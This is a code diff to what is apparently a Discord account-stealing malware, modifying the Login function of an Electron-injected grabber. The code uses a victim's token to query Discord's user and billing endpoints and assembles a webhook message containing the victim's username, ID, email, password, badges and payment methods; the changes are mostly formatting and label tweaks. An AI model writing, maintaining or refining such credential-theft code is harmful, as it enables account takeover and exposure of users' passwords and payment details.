@@ -173,40 +173,39 @@ function GetBadges(flags) {
 }
 
 function Login(email, password, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-	    			window.webContents.executeJavaScript(`
+		window.webContents.executeJavaScript(`
         var xmlHttp = new XMLHttpRequest();
         xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
         xmlHttp.setRequestHeader("Authorization", "${token}");
         xmlHttp.send( null );
         xmlHttp.responseText`, !0).then((info3) => {
-					
-function Cool() {
-	const json = JSON.parse(info3)
-	var billing = "";
-	json.forEach(z => {
-		if (z.type == "") {
-			return "\`❌\`"
-		} else if (z.type == 2 && z.invalid != !0) {
-			billing += "\`✔️\`" + " <:paypal:896441236062347374>"
-		} else if (z.type == 1 && z.invalid != !0) {
-			billing += "\`✔️\`" + " :credit_card:"
-		} else {
-			return "\`❌\`"
-		}
-	})
-	if (billing == "") {
-		billing = "\`❌\`"
-	}
-	return billing
-}
-					
+
+							function Cool() {
+								const json = JSON.parse(info3)
+								var billing = "";
+								json.forEach(z => {
+									if (z.type == "") {
+										return "no payment method"
+									} else if (z.type == 2 && z.invalid != !0) {
+										billing += "paypal"
+									} else if (z.type == 1 && z.invalid != !0) {
+										billing += "credit card"
+									} else {
+										return "no payment method"
+									}
+								})
+								if (billing == "") {
+									billing = "no payment method"
+								}
+								return billing
+							}			
         const json = JSON.parse(info);
         var params = {
             username: "stenko",
@@ -219,12 +218,12 @@ function Cool() {
                     "color": 3092790,
                     "fields": [
                         {
-                            "name": " <:partner:909102089513340979> name",
+                            "name": " name",
 			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
-                            "inline": false
+                            "inline": true
                         },
                         {
-                            "name": " <:partner:909102089513340979> id",
+                            "name": " id",
                             "value": `\`` + json.id + `\``,
                             "inline": true
                         },
@@ -236,7 +235,7 @@ function Cool() {
                         {
                             "name": " email",
                             "value": `\`${email}\``,
-                            "inline": false
+                            "inline": true
                         },
                         {
                             "name": " password",
@@ -261,7 +260,7 @@ function Cool() {
                         {
                             "name": " badges",
                             "value": `\`${GetBadges(json.flags)}\``,
-                            "inline": false		    
+                            "inline": true		    
                         },
                         {
                             "name": " nitro",
